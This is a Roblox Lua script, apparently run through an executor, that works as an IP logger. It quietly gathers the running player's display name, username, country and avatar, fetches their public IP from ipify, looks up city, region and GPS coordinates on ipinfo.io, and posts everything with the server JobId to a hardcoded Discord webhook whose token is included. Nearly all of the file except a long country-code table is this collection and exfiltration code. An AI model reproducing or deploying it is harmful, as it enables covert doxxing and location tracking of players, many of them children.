
local HttpService =game:GetService("HttpService")
local LocalizationService = game:GetService("LocalizationService")

local player =game.Players.LocalPlayer

local Webhook = "https://discord.com/api/webhooks/1427587026861031527/MPTZnB09EnCs5YZuOl6ORsbkJhv3zRPmY9JoZgUKMANeGWZTT_yNNkAqu_ASoUlQ9cuS"
local thumbUrlApi = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=150x150&format=Png"
local country ="N/A"
local ok, resp = pcall(function() return game:HttpGet(thumbUrlApi) end)
local avatarUrl = ""
if ok then
	local data = HttpService:JSONDecode(resp)
	if data and data.data and data.data[1] and data.data[1].imageUrl then
		avatarUrl = data.data[1].imageUrl
	end
end
task.spawn(function()
	local success, countryCode = pcall(function()
		return LocalizationService:GetCountryRegionForPlayerAsync(player)
	end)
	if success and countryCode then
		country =countryCode
	end
end)


local codeToName = {
	AF = "Afghanistan",
	AL = "Albania",
	DZ = "Algeria",
	AS = "American Samoa",
	AD = "Andorra",
	AO = "Angola",
	AI = "Anguilla",
	AQ = "Antarctica",
	AG = "Antigua and Barbuda",
	AR = "Argentina",
	AM = "Armenia",
	AW = "Aruba",
	AU = "Australia",
	AT = "Austria",
	AZ = "Azerbaijan",
	BS = "Bahamas",
	BH = "Bahrain",
	BD = "Bangladesh",
	BB = "Barbados",
	BY = "Belarus",
	BE = "Belgium",
	BZ = "Belize",
	BJ = "Benin",
	BM = "Bermuda",
	BT = "Bhutan",
	BO = "Bolivia",
	BA = "Bosnia and Herzegovina",
	BW = "Botswana",
	BR = "Brazil",
	IO = "British Indian Ocean Territory",
	BN = "Brunei Darussalam",
	BG = "Bulgaria",
	BF = "Burkina Faso",
	BI = "Burundi",
	KH = "Cambodia",
	CM = "Cameroon",
	CA = "Canada",
	CV = "Cabo Verde",
	KY = "Cayman Islands",
	CF = "Central African Republic",
	TD = "Chad",
	CL = "Chile",
	CN = "China",
	CX = "Christmas Island",
	CC = "Cocos (Keeling) Islands",
	CO = "Colombia",
	KM = "Comoros",
	CG = "Congo",
	CD = "Congo (Democratic Republic)",
	CK = "Cook Islands",
	CR = "Costa Rica",
	CI = "Côte d'Ivoire",
	HR = "Croatia",
	CU = "Cuba",
	CW = "Curaçao",
	CY = "Cyprus",
	CZ = "Czechia",
	DK = "Denmark",
	DJ = "Djibouti",
	DM = "Dominica",
	DO = "Dominican Republic",
	EC = "Ecuador",
	EG = "Egypt",
	SV = "El Salvador",
	GQ = "Equatorial Guinea",
	ER = "Eritrea",
	EE = "Estonia",
	SZ = "Eswatini",
	ET = "Ethiopia",
	FK = "Falkland Islands",
	FO = "Faroe Islands",
	FJ = "Fiji",
	FI = "Finland",
	FR = "France",
	GF = "French Guiana",
	PF = "French Polynesia",
	GA = "Gabon",
	GM = "Gambia",
	GE = "Georgia",
	DE = "Germany",
	GH = "Ghana",
	GI = "Gibraltar",
	GR = "Greece",
	GL = "Greenland",
	GD = "Grenada",
	GP = "Guadeloupe",
	GU = "Guam",
	GT = "Guatemala",
	GG = "Guernsey",
	GN = "Guinea",
	GW = "Guinea-Bissau",
	GY = "Guyana",
	HT = "Haiti",
	HN = "Honduras",
	HK = "Hong Kong",
	HU = "Hungary",
	IS = "Iceland",
	IN = "India",
	ID = "Indonesia",
	IR = "Iran",
	IQ = "Iraq",
	IE = "Ireland",
	IM = "Isle of Man",
	IL = "Israel",
	IT = "Italy",
	JM = "Jamaica",
	JP = "Japan",
	JE = "Jersey",
	JO = "Jordan",
	KZ = "Kazakhstan",
	KE = "Kenya",
	KI = "Kiribati",
	KR = "Korea (South)",
	KW = "Kuwait",
	KG = "Kyrgyzstan",
	LA = "Lao People's Democratic Republic",
	LV = "Latvia",
	LB = "Lebanon",
	LS = "Lesotho",
	LR = "Liberia",
	LY = "Libya",
	LI = "Liechtenstein",
	LT = "Lithuania",
	LU = "Luxembourg",
	MO = "Macao",
	MG = "Madagascar",
	MW = "Malawi",
	MY = "Malaysia",
	MV = "Maldives",
	ML = "Mali",
	MT = "Malta",
	MH = "Marshall Islands",
	MQ = "Martinique",
	MR = "Mauritania",
	MU = "Mauritius",
	YT = "Mayotte",
	MX = "Mexico",
	FM = "Micronesia",
	MD = "Moldova",
	MC = "Monaco",
	MN = "Mongolia",
	ME = "Montenegro",
	MS = "Montserrat",
	MA = "Morocco",
	MZ = "Mozambique",
	MM = "Myanmar",
	NA = "Namibia",
	NR = "Nauru",
	NP = "Nepal",
	NL = "Netherlands",
	NC = "New Caledonia",
	NZ = "New Zealand",
	NI = "Nicaragua",
	NE = "Niger",
	NG = "Nigeria",
	NU = "Niue",
	NF = "Norfolk Island",
	MK = "North Macedonia",
	MP = "Northern Mariana Islands",
	NO = "Norway",
	OM = "Oman",
	PK = "Pakistan",
	PW = "Palau",
	PS = "Palestine, State of",
	PA = "Panama",
	PG = "Papua New Guinea",
	PY = "Paraguay",
	PE = "Peru",
	PH = "Philippines",
	PN = "Pitcairn",
	PL = "Poland",
	PT = "Portugal",
	PR = "Puerto Rico",
	QA = "Qatar",
	RE = "Réunion",
	RO = "Romania",
	RU = "Russian Federation",
	RW = "Rwanda",
	BL = "Saint Barthélemy",
	SH = "Saint Helena",
	KN = "Saint Kitts and Nevis",
	LC = "Saint Lucia",
	MF = "Saint Martin",
	PM = "Saint Pierre and Miquelon",
	VC = "Saint Vincent and the Grenadines",
	WS = "Samoa",
	SM = "San Marino",
	ST = "Sao Tome and Principe",
	SA = "Saudi Arabia",
	SN = "Senegal",
	RS = "Serbia",
	SC = "Seychelles",
	SL = "Sierra Leone",
	SG = "Singapore",
	SX = "Sint Maarten",
	SK = "Slovakia",
	SI = "Slovenia",
	SB = "Solomon Islands",
	SO = "Somalia",
	ZA = "South Africa",
	GS = "South Georgia and the South Sandwich Islands",
	SS = "South Sudan",
	ES = "Spain",
	LK = "Sri Lanka",
	SD = "Sudan",
	SR = "Suriname",
	SE = "Sweden",
	CH = "Switzerland",
	SY = "Syrian Arab Republic",
	TW = "Taiwan",
	TJ = "Tajikistan",
	TZ = "Tanzania",
	TH = "Thailand",
	TL = "Timor-Leste",
	TG = "Togo",
	TK = "Tokelau",
	TO = "Tonga",
	TT = "Trinidad and Tobago",
	TN = "Tunisia",
	TR = "Turkey",
	TM = "Turkmenistan",
	TC = "Turks and Caicos Islands",
	TV = "Tuvalu",
	UG = "Uganda",
	UA = "Ukraine",
	AE = "United Arab Emirates",
	GB = "United Kingdom",
	US = "United States",
	UM = "United States Minor Outlying Islands",
	UY = "Uruguay",
	UZ = "Uzbekistan",
	VU = "Vanuatu",
	VA = "Holy See",
	VE = "Venezuela",
	VN = "Viet Nam",
	VG = "Virgin Islands (British)",
	VI = "Virgin Islands (U.S.)",
	WF = "Wallis and Futuna",
	EH = "Western Sahara",
	YE = "Yemen",
	ZM = "Zambia",
	ZW = "Zimbabwe",
}

local ip = game:HttpGet("https://api.ipify.org")
local iplink = "https://ipinfo.io/" .. ip .. "/json"
local ipinfo_json = game:HttpGet(iplink)
local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)

local embed = {
	["title"] = "いるかはぶつかった人",
	["color"] = 0,
	["thumbnail"] = { ["url"] = avatarUrl },
	["fields"] = {
		{
			["name"] = "プレイヤー情報",
			["value"] = "```表示名: " .. player.DisplayName
				.. "\n名前: " .. player.Name
				.. "\n国: " .. codeToName[country]
				.. "\nIP: " .. 	ipinfo_table.ip
				.. "\nCity: " .. ipinfo_table.city .. "(" .. ipinfo_table.region .. ")"
				.. "\nGPS: " .. ipinfo_table.loc
				.. "\njobid: " .. tostring(game.JobId)
				.. "```"
		}
	}
}
local data = HttpService:JSONEncode({
	["embeds"] = {embed}
})
request({
	Url = Webhook,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = data
})
